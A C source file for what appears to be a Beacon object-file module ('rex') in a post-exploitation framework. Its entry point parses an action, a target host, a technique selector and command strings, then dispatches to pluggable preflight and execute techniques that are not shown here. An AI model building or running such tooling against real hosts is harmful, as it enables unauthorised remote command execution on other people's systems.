#include "beacon.h"
#include "rex.h"

static void rex_fail(rex_result *output, rex_phase phase,
                     HRESULT error) {
    output->status = REX_STATUS_FAILED;
    output->phase = phase;
    output->error = error;
    rex_result_write(output);
}

void go(char *args, int argument_length) {
    datap parser;
    int target_size = 0;
    int selector_size = 0;
    int action_size = 0;
    int value_sizes[3] = {0};
    int value_index;
    char *target;
    char *selector;
    char *action;
    wchar_t *values[3];
    HRESULT result;
    rex_arguments arguments = {0};
    rex_observation observation = {0};
    rex_request request = {0};
    rex_result output = {0};
    rex_state state = {0};
    const rex_technique *technique;

    output.technique = "";
    output.target = "";
    BeaconDataParse(&parser, args, argument_length);
    action = BeaconDataExtract(&parser, &action_size);
    target = BeaconDataExtract(&parser, &target_size);
    selector = BeaconDataExtract(&parser, &selector_size);
    for (value_index = 0; value_index < 3; value_index++) {
        values[value_index] = (wchar_t *)BeaconDataExtract(
            &parser, &value_sizes[value_index]);
    }

    if (action == NULL || target == NULL || selector == NULL ||
        action_size < 2 ||
        target_size < 2 || selector_size < 2 ||
        action[action_size - 1] != '\0' ||
        target[target_size - 1] != '\0' || selector[selector_size - 1] != '\0' ||
        action_size != (int)(rex_strlen(action) + 1) ||
        target_size != (int)(rex_strlen(target) + 1) ||
        selector_size != (int)(rex_strlen(selector) + 1) ||
        BeaconDataLength(&parser) != 0 ||
        (!rex_streq(action, "execute") && !rex_streq(action, "preflight")) ||
        !rex_valid_target(target) || !rex_valid_selector(selector)) {
        rex_fail(&output, REX_PHASE_INPUT, E_INVALIDARG);
        return;
    }
    for (value_index = 0; value_index < 3; value_index++) {
        if (values[value_index] == NULL ||
            value_sizes[value_index] < (int)sizeof(wchar_t) ||
            value_sizes[value_index] % (int)sizeof(wchar_t) != 0 ||
            values[value_index][(value_sizes[value_index] / (int)sizeof(wchar_t)) - 1] != L'\0' ||
            value_sizes[value_index] !=
                (int)((rex_wcslen(values[value_index]) + 1) * sizeof(wchar_t)) ||
            rex_wcslen(values[value_index]) > REX_MAX_COMMAND) {
            rex_fail(&output, REX_PHASE_INPUT, E_INVALIDARG);
            return;
        }
    }

    output.target = target;
    output.technique = selector;
    technique = rex_find_technique(selector);
    if (technique == NULL) {
        rex_fail(&output, REX_PHASE_INPUT, E_INVALIDARG);
        return;
    }

    arguments.action = rex_streq(action, "preflight")
        ? REX_ACTION_PREFLIGHT : REX_ACTION_EXECUTE;
    arguments.target = target;
    arguments.selector = selector;
    for (value_index = 0; value_index < 3; value_index++) {
        arguments.values[value_index] = values[value_index];
    }
    request.target = target;
    request.selector = selector;
    result = technique->decode(&arguments, &request);
    if (FAILED(result)) {
        rex_fail(&output, REX_PHASE_INPUT, result);
        return;
    }
    result = technique->preflight(&request, &state);
    if (FAILED(result)) {
        technique->release(&state);
        rex_fail(&output, REX_PHASE_PREFLIGHT, result);
        return;
    }
    if (arguments.action == REX_ACTION_PREFLIGHT) {
        output.status = REX_STATUS_SUCCEEDED;
        output.disposition = REX_DISPOSITION_VALIDATED;
        output.evidence_source = technique->preflight_evidence_source;
        rex_result_write(&output);
        technique->release(&state);
        return;
    }
    result = technique->execute(&request, &state, &observation);
    output.observation = observation;
    if (FAILED(result)) {
        rex_fail(&output, REX_PHASE_EXECUTION, result);
        technique->release(&state);
        return;
    }

    output.status = REX_STATUS_SUCCEEDED;
    output.disposition = technique->success_disposition;
    output.evidence_source = technique->execution_evidence_source;
    rex_result_write(&output);
    technique->release(&state);
}
